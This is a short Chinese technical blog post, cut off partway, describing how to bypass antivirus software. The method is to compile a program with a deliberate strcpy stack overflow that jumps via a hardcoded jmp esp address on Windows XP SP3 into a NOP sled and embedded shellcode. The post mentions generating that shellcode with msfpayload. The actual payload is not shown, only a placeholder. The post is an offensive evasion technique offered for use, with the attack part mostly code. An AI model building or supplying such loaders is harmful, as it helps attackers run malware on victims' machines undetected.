通过溢出漏洞绕过杀毒防护

Moto • 2016年8月3日 • 技术控, 系统安全 • 阅读 1172

思路

通过编写一具有溢出漏洞的程序，并将恶意代码写入 shellcode 中，溢出后执行 shellcode 可以绕过杀毒软件的防护。

测试环境

Platform：Windows XP SP3

Compiler：VC 6.0

测试代码

构造如下漏洞代码加载 shellcode：

#include <stdio.h>
#include <string.h>
void overflow(char * input)
{
char buf[4];
strcpy(buf, input);
}
void main()
{
char shellcode[] = "AAAAAAAA"
"\x7b\x46\x86\x7c" //jmp esp
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"shellcode"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90";

overflow(shellcode);
}

首先，通过 msfpayload 生成一 payload，进行查杀，发现大部分杀毒都会报毒：

 

生成 shellcode，并填入源码中：
